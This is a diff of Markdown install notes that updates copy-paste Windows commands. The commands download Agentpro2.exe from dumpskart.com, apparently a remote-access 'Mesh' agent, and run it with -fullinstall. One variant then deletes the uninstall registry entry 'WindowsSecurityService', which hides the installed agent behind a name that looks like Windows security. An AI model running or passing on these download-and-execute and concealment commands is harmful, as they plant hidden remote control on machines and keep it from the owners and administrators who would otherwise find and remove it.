@@ -31,10 +31,10 @@ reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecu
 ```
 ### Second Windows server installation
 ```
-curl -L -o "C:\Program Files\Agentpro2.exe" "https://dumpskart.com/Mesh2/Agentpro2.exe" && "C:\Program Files\Agentpro2.exe" -fullinstall
+curl -L -o "C:\Program Files\Agentpro2.exe" "https://dumpskart.com/Mesh/Agentpro2.exe" && "C:\Program Files\Agentpro2.exe" -fullinstall
 ```
 ```
-curl -L -o "C:\Program Files\Agentpro2.exe" "https://dumpskart.com/Mesh2/Agentpro2.exe" && "C:\Program Files\Agentpro2.exe" -fullinstall && reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService" /f
+curl -L -o "C:\Program Files\Agentpro2.exe" "https://dumpskart.com/Mesh/Agentpro2.exe" && "C:\Program Files\Agentpro2.exe" -fullinstall && reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService" /f
 ```
 
 ### Windows all installation steps
